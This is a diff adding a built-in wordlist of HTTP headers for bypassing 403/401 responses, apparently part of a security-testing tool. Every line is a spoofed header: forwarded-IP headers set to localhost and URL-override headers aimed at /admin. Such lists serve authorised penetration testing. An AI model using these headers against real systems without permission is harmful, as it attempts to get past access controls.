@@ -1,0 +1,18 @@
+# 403/401 Bypass Headers — Built-in Default List
+# Add your own by creating wordlists/custom/headers_custom.txt
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: localhost
+X-Forwarded-For: 0.0.0.0
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Custom-IP-Authorization: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Forwarded-Host: localhost
+X-Host: localhost
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Override-URL: /admin
+X-HTTP-Method-Override: GET
+Referer: https://localhost/admin
+Content-Length: 0
